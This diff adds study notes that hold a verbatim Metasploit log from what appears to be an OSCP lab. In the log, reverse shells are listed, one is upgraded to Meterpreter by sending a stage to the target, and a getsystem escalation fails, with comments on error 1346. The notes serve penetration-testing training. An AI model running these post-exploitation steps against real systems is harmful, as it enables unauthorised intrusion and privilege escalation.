@@ -1,0 +1,51 @@
+# msfconsole — session list and the failed escalation attempt (verbatim)
+
+msf > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information            Connection
+  --  ----  ----                   -----------            ----------
+  11        shell x86/windows      Shell Banner: Microso  192.168.45.158:4444 -
+                                   ft Windows [Version 1  > 192.168.103.145:509
+                                   0.0.19041.1] -----     15 (192.168.103.145)
+  13        meterpreter x64/windo  OSCP\offsec @ OSCP     192.168.45.158:4433 -
+            ws                                            > 192.168.103.145:509
+                                                          46 (192.168.103.145)
+
+msf > sessions -u 13
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [13]
+[*] Upgrading session ID: 13
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.45.158:4433
+[*] Sending stage (232006 bytes) to 192.168.103.145
+[*] Meterpreter session 14 opened (192.168.45.158:4433 -> 192.168.103.145:50949) at 2026-11-21 02:07:50 -0500
+[*] Stopping exploit/multi/handler
+
+msf > sessions -i 14
+[*] Starting interaction with 14...
+
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
+[-] Named Pipe Impersonation (PrintSpooler variant)
+[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
+
+meterpreter > getuid
+Server username: OSCP\offsec
+
+# 1346 = ERROR_BAD_IMPERSONATION_LEVEL
+#   "Either a required impersonation level was not provided, or the provided
+#    impersonation level is invalid."
+# On getsystem this means the token lacks SeImpersonatePrivilege, which is why
+# all six techniques failed with the same error. A potato cannot help here:
+# it consumes that privilege rather than granting it.
+
+# Also observed (cosmetic but instructive): ids drift as sessions are created,
+# so an id typed from memory fails:
+#   msf > sessions -u 12
+#   [-] Invalid session identifier: 12
